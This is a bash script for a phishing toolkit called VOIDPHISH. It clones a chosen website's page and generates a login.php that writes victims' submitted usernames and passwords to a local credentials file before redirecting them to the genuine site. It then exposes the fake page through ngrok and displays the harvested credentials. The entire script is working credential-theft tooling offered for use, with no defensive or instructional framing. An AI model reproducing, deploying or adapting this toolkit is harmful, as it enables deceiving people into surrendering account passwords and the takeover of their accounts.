#!/bin/bash
cd "$(dirname "$0")"

# VOIDPHISH - Advanced Phishing Toolkit
# Author: Alex 
# Version: 1.0

# ANSI colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

# Banner
display_banner() {
    clear
    echo -e "${BLUE}
 ██▒   █▓ ▒█████   ██▓▓█████▄  ██▓███   ██░ ██  ██▓  ██████  ██░ ██ 
▓██░   █▒▒██▒  ██▒▓██▒▒██▀ ██▌▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
 ▓██  █▒░▒██░  ██▒▒██▒░██   █▌▓██░ ██▓▒▒██▀▀██░▒██▒  ▓██▄   ▒██▀▀██░
  ▒██ █░░▒██   ██░░██░░▓█▄   ▌▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ 
   ▒▀█░  ░ ████▓▒░░██░░▒████▓ ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓
   ░ ▐░  ░ ▒░▒░▒░ ░▓   ▒▒▓  ▒ ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
   ░ ░░    ░ ▒ ▒░  ▒ ░ ░ ▒  ▒ ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
     ░░  ░ ░ ░ ▒   ▒ ░ ░ ░  ░ ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░
      ░      ░ ░   ░     ░               ░  ░  ░ ░        ░   ░  ░  ░
     ░                 ░                                               
${RESET}"
    echo -e "${CYAN} Advanced Phishing Toolkit ${RESET}"
    echo -e "${YELLOW}—————————————————————————————————————————————————${RESET}\n"
}

# Check dependencies
check_dependencies() {
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking dependencies...${RESET}"
    dependencies=("php" "ngrok")
    
    for dependency in "${dependencies[@]}"; do
        if ! command -v $dependency &> /dev/null; then
            echo -e "${RED}[${WHITE}!${RED}]${CYAN} $dependency is not installed. Please install it and try again.${RESET}"
            exit 1
        fi
    done
    
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} All dependencies are installed.${RESET}"
    
    # Create .server directory if it doesn't exist
    if [ ! -d ".server" ]; then
        mkdir -p .server
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Created .server directory${RESET}"
    fi
}

# Kill background processes
kill_processes() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Cleaning up...${RESET}"
    
    if [ -f ".server/server.pid" ]; then
        server_pid=$(cat .server/server.pid)
        if ps -p $server_pid > /dev/null; then
            kill $server_pid 2>/dev/null
            echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} PHP server stopped.${RESET}"
        fi
        rm .server/server.pid
    fi
    
    if [ -f ".server/ngrok.pid" ]; then
        ngrok_pid=$(cat .server/ngrok.pid)
        if ps -p $ngrok_pid > /dev/null; then
            kill $ngrok_pid 2>/dev/null
            echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Ngrok stopped.${RESET}"
        fi
        rm .server/ngrok.pid
    fi
    
    # Kill any remaining PHP or Ngrok processes
    pkill -f "php -S" 2>/dev/null
    pkill -f "ngrok" 2>/dev/null
    
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} All processes cleaned up.${RESET}"
}

# Handle Ctrl+C
trap_ctrl_c() {
    echo -e "\n${RED}[${WHITE}!${RED}]${CYAN} Ctrl+C detected. Exiting...${RESET}"
    kill_processes
    exit 1
}

# Set trap for Ctrl+C
trap trap_ctrl_c INT

# Display available sites
display_sites() {
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Available phishing templates:${RESET}\n"
    
    local sites=()
    local i=1
    
    for site in sites/*/; do
        site=${site%/}
        site=${site#sites/}
        sites+=("$site")
        echo -e "  ${GREEN}[$i]${CYAN} $site${RESET}"
        i=$((i+1))
    done
    
    echo ""
    return 0
}

# Start phishing attack
start_phishing() {
    local site=$1
    local port=8080
    
    # Check if site exists
    if [ ! -d "sites/$site" ]; then
        echo -e "${RED}[${WHITE}!${RED}]${CYAN} Template '$site' does not exist.${RESET}"
        return 1
    fi
    
    # Start PHP server
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Starting phishing campaign with '$site' template...${RESET}"
    bash server.sh $site $port
    
    # Start Ngrok
    bash ngrok.sh $port
    
    # Display credential harvesting instructions
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${YELLOW} Waiting for credentials... Press Ctrl+C to exit.${RESET}"
    echo -e "${GREEN}[${WHITE}+${GREEN}]${YELLOW} Credentials will be saved to .server/credentials.txt${RESET}"
    
    # Monitor credentials file
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Monitoring for credentials (Ctrl+C to stop):${RESET}\n"
    tail -f .server/credentials.txt
}

# Clone a website
clone_website() {
    local url=$1
    local folder_name=$2
    
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Cloning website: $url${RESET}"
    
    # Create directory for the cloned site
    mkdir -p "sites/$folder_name"
    
    # Clone the website using wget
    if command -v wget &> /dev/null; then
        wget --no-check-certificate -O "sites/$folder_name/index.html" "$url" > /dev/null 2>&1
    elif command -v curl &> /dev/null; then
        curl -s -k -o "sites/$folder_name/index.html" "$url"
    else
        echo -e "${RED}[${WHITE}!${RED}]${CYAN} Failed to clone website. Please install wget or curl.${RESET}"
        return 1
    fi
    
    # Create basic login.php for credential harvesting
    cat > "sites/$folder_name/login.php" <<EOF
<?php
file_put_contents("../../.server/credentials.txt", "$folder_name Login\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Username: " . \$_POST['username'] . "\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Password: " . \$_POST['password'] . "\n\n", FILE_APPEND);
header('Location: $url');
exit();
?>
EOF
    
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Website cloned successfully to sites/$folder_name${RESET}"
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} You'll need to edit the login.php file to match the form fields of the cloned site${RESET}"
    return 0
}

# Main menu
main_menu() {
    while true; do
        display_banner
        echo -e "${GREEN}[${WHITE}1${GREEN}]${CYAN} Launch Phishing Attack${RESET}"
        echo -e "${GREEN}[${WHITE}2${GREEN}]${CYAN} Clone Website${RESET}"
        echo -e "${GREEN}[${WHITE}3${GREEN}]${CYAN} View Credentials${RESET}"
        echo -e "${GREEN}[${WHITE}4${GREEN}]${CYAN} Exit${RESET}\n"
        read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Select an option: \e[0m' option
        
        case $option in
            1)
                # Launch phishing attack
                display_banner
                display_sites
                
                # Prompt for site selection
                read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Enter template number or name: \e[0m' site_choice
                
                # Handle numeric input
                if [[ $site_choice =~ ^[0-9]+$ ]]; then
                    local i=1
                    for site in sites/*/; do
                        site=${site%/}
                        site=${site#sites/}
                        if [ $i -eq $site_choice ]; then
                            site_choice=$site
                            break
                        fi
                        i=$((i+1))
                    done
                fi
                
                start_phishing $site_choice
                ;;
            2)
                # Clone website
                display_banner
                read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Enter the URL to clone (e.g., https://example.com): \e[0m' url
                read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Enter a name for this template: \e[0m' folder_name
                
                clone_website $url $folder_name
                read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Press Enter to continue \e[0m'
                ;;
            3)
                # View credentials
                display_banner
                echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Harvested Credentials:${RESET}\n"
                
                if [ -f ".server/credentials.txt" ]; then
                    cat .server/credentials.txt
                else
                    echo -e "${YELLOW}[${WHITE}!${YELLOW}]${CYAN} No credentials found yet.${RESET}"
                fi
                
                read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;37m Press Enter to continue \e[0m'
                ;;
            4)
                # Exit
                echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Exiting VOIDPHISH...${RESET}"
                kill_processes
                exit 0
                ;;
            *)
                echo -e "${RED}[${WHITE}!${RED}]${CYAN} Invalid option. Please try again.${RESET}"
                sleep 1
                ;;
        esac
    done
}

# Execute main function
check_dependencies
main_menu
